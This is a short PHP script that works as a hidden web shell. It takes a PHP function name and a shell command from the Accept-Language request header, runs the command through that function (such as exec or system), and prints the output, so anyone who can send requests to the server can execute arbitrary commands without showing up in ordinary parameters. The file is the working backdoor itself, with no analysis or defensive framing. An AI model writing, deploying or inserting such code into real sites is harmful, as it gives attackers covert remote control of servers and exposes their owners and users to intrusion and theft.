<?php

// Check If Command Was Submitted
if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) && strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'], ':') !== false){
	// Store Output
	$output;
	
	// Split PHP Function And Command
	$_ = explode(":", $_SERVER['HTTP_ACCEPT_LANGUAGE'], 2);
	// PHP Function, Example: exec, system
	$__ = $_[0];
	// Command, Example: ls
	$___ = $_[1];
	
	// Execute Command And Store Each Line Of Output In $output Array
	$__($___, $output);

	// Echo Each Line Of Output
	foreach ($output as $value) {
		echo $value."<br>";
	}


}
